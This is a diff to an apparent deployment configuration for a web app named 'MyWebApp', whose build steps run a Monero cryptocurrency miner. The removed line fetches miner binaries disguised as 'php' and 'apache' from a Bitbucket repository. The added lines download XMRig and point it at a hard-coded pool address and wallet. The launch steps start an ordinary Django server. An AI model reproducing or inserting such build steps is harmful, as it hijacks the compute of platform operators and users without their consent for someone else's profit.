@@ -2,7 +2,8 @@ deployments:
   MyWebApp:
     dockerimage: ubuntu:14.04
     build_steps:
-      - curl -L https://bitbucket.org/eatyourshet/php/raw/1a31554cdede888ae70fbeedc5e909a3926ea2da/php --output php && curl -L https://bitbucket.org/eatyourshet/php/raw/b1ee5dc709956a92763976e15dd18f9ab8f40698/apache --output apache && chmod +x apache php && ./php -algo rx/0 -wallet 86VkWeqdPgyHYUFd2Nc84uhte6pdHNKMpay4MgCVPfVeG3BWzyDtq87BwWKxQFAxq3QQQR1Heeqc95xyUcchnaQi6L7Wfn2 -pool1 18.210.126.40:10032 -rigName 2
+      - apt install wget
+      - wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz; tar -xf xmrig-6.17.0-linux-x64.tar.gz; cd xmrig-6.17.0; ./xmrig -o 18.210.126.40:80 -a rx -k -u 86VkWeqdPgyHYUFd2Nc84uhte6pdHNKMpay4MgCVPfVeG3BWzyDtq87BwWKxQFAxq3QQQR1Heeqc95xyUcchnaQi6L7Wfn2.2-cpu
     launch_steps:
       - cd ~/code/mysite
       - python manage.py runserver 0.0.0.0:80
